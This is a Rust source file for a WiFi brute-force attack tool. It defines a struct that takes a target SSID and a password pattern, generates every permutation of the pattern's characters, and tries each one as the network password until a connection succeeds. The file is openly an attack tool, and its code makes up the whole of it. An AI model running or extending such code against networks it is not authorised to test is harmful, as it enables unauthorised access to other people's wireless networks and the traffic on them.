extern crate permutohedron;

use self::permutohedron::heap_recursive;
use config::Config;
use network::ProfileNetwork;
use std::io;

#[derive(Debug)]
pub struct WifiBruteforcer<'a> {
    pub config: Config<'a>,
    pub(crate) profile_network: ProfileNetwork,
}

/// The Bruteforcer module responsible for performing the attack.
impl<'a> WifiBruteforcer<'a> {
    /// Creates a new instance of the bruteforcer encapsulates in a Result.
    pub fn new(config: Config<'a>) -> Result<Self, io::Error> {
        match ProfileNetwork::new(config.ssid) {
            Ok(network) => Ok(WifiBruteforcer {
                config,
                profile_network: network,
            }),
            Err(err) => Err(err),
        }
    }

    /// Generates permutatation of vectors of characters passed in, using
    /// a heap recusive strategy.
    fn permutate_characters(&self, data: Vec<char>) -> Vec<String> {
        let mut data = data.to_owned();
        let mut permutations: Vec<String> = Vec::new();

        heap_recursive(&mut data, |p| {
            let w: String = p.to_vec().into_iter().collect();
            permutations.push(w);
        });

        permutations
    }

    /// Generates all possible passwords based on a previously passed in
    /// guessed pattern or the ASCII characters.
    fn generate_all_possible_password(&self) -> Vec<String> {
        let vals: Vec<char> = self.config.pattern_password.chars().collect();
        let possible_combinations = self.permutate_characters(vals);

        possible_combinations
    }

    /// Triggers the bruteforcer to try all possible combinations to break the network.
    pub fn perform_attack(&mut self) -> Result<Option<String>, io::Error> {
        // Generate password combination
        let trial_passwords = self.generate_all_possible_password();

        // This needs GREAT improvement:
        // Run Async
        for password in trial_passwords.iter() {
            if self.profile_network.connect(password) {
                return Ok(Some(password.to_string()));
            }
        }

        Ok(None)
    }
}
